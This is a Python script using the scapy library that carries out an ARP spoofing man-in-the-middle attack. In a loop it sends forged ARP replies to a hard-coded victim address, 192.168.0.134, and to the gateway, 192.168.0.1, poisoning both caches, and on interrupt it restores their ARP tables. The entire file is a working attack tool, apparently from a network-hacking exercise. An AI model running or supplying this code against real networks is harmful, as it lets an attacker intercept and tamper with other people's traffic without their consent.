#!/usr/bin/env python 

import scapy.all as scapy
import time 

def	get_mac(ip):
	arp_request_broadcast = (scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/
		scapy.ARP(pdst=ip, hwlen=6, plen=4))
	answered = scapy.srp1(arp_request_broadcast, timeout=1, verbose=False)

	return answered[0].hwsrc 

def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip,
		hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet)

def spoof_ipmac_ip(target_ip, target_mac, spoof_ip):
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet, verbose=False)
	

def restore_ipmac_ipmac(dest_ip, dest_mac, source_ip, source_mac):	
	packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, 
		psrc=source_ip, hwsrc=source_mac)
	scapy.send(packet, verbose=False, count=4)


mac_victim = get_mac("192.168.0.134")
mac_route = get_mac("192.168.0.1")

sent_packets_count = 0
try:
	while True:
		spoof_ipmac_ip("192.168.0.134", mac_victim, "192.168.0.1")
		spoof_ipmac_ip("192.168.0.1", mac_route, "192.168.0.134")
		sent_packets_count = sent_packets_count + 2
		print("\r[+] Packets sent: " + str(sent_packets_count), end="")
		time.sleep(2)
except KeyboardInterrupt:
		print("[+] Detected CTRL + C ......Quitting.")
		print("[+] Restoring ARP table:")
		restore_ipmac_ipmac("192.168.0.134", mac_victim, 
			"192.168.0.1", mac_route)
		restore_ipmac_ipmac("192.168.0.1", mac_route, 
			"192.168.0.134", mac_victim)

